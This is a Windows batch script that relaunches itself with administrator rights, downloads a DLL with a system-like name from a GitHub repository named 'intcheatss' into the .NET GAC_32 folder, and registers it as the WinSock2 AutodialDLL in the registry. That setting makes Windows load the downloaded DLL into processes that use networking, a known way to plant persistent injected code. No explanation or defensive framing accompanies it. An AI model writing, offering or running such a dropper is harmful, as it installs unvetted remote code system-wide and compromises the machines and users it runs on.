@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Restarting with admin rights...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

:: Download the DLL from GitHub
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/64file911/intcheatss/raw/refs/heads/main/MSTTSLooc.dll', 'C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll')"

:: Check if download was successful
if %errorLevel% neq 0 (
    echo Failed to download the DLL file.
    exit /b
)

:: Move the downloaded DLL to C:\Windows\
move /Y "C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll" "C:\Windows\Microsoft.NET\assembly\GAC_32\"

:: Update the registry entry
reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "C:\Windows\Microsoft.NET\assembly\GAC_32\MSTTSLooc.dll" /F

:: Exit without pause
exit
